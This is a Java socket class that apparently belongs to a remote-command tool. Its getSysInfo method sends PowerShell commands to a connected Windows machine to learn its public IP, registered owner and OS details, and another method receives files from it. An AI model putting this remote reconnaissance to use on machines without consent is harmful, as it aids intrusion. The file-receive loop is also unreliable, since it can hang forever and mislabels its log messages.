package connection;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;

public class Connection {
	private Socket _s;
	private DataOutputStream _dout;
	private DataInputStream _din;
	
	public Connection(Socket s) throws IOException {
		_s = s;
		_dout = new DataOutputStream(s.getOutputStream());
		_din = new DataInputStream(s.getInputStream());
	}
	
	public String send(String str) throws IOException {
		_dout.writeUTF(str);
		_dout.flush();
		
		return _din.readUTF();
	}
	
	public String receive() throws IOException {
		return _din.readUTF();
	}
	
	public long receive(String fileName) throws IOException {
	    int length = Integer.valueOf(receive());
	    byte [] mybytearray  = new byte [length];
		
	    InputStream is = _s.getInputStream();
	    FileOutputStream out = new FileOutputStream(new File(fileName));
	    BufferedOutputStream bos = new BufferedOutputStream(out);
	    
	    //is.read tries to read up to length, but may read less
	    int bytesRead = is.read(mybytearray, 0, length);
	    int current = bytesRead;

	    System.out.println("Sending " + fileName + " (" + length + " bytes)");
	    
	    while (current != length) {
	    	bytesRead = is.read(mybytearray, current, (length - current));
	    	if(bytesRead >= 0) {
	    		current += bytesRead;
	    	}
	    }
	    System.out.println("File sent");

	    bos.write(mybytearray, 0 , length);
	    bos.flush();
	    
	    is.close();
		out.close();
		bos.close();
		
		return length;
	}

	public void end() throws IOException {
		_s.close();
	}

	public boolean connectionIsOpen() {
		return !_s.isClosed();
	}
	
	public String getSysInfo() throws IOException {
		String sysInfo = "[not found]";
		
		if(_s.isConnected()) {
			_dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
			_dout.flush();
			sysInfo = "\n" + "Public ip: " + _din.readUTF();
			
			_dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
			_dout.flush();
			sysInfo += _din.readUTF();
		}
		
		return sysInfo;
	}
}
